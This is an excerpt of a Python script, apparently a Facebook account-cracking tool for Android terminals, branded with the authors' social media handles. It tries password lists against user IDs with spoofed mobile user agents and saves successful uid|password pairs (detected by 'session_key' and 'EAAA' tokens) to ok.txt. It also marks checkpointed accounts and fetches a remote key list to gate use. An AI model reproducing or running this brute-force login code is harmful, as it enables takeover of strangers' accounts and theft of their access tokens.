...
def helpnote():
	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(SHANi-ASiF-BRAND))
	subprocess.check_output(["am", "start", "https://github.com/ASiF-KH4N-420-320/SHANi-ASiF-BRAND.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/profile.php?id=100074766201169")
...
def notice():
	...
	runtxt("\033[0;92m MSBPASS ADMIN MESSENGER >> https://www.facebook.com/profile.php?id=100074766201169")
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100074766201169"])
	"os.system('xdg-open https://wa.me/+92315959***1"
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Musab09889/OLD1/blob/main/G.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[1;92m                                     
\033[1;90m═══════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK :  SHANI ASIF
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : BD
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   :      SHANI ASIF
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : MSBPASS 
\033[1;90m══════════════════════════════════════════════════
    """)
...
"Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
  "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		...
		sys.stdout.write(
			"\r\r %s[>_] [Z4Y4N M4LIK] : %s/%s -> \033[0;92m [ Z4Y4N M4LIK-OK:%s ]- \033[0;91m[MSB-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [Z4Y4N M4LIK-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [Z4Y4N M4LIK-CP] %s | %s\033[0;97m         "%(uid, pw))
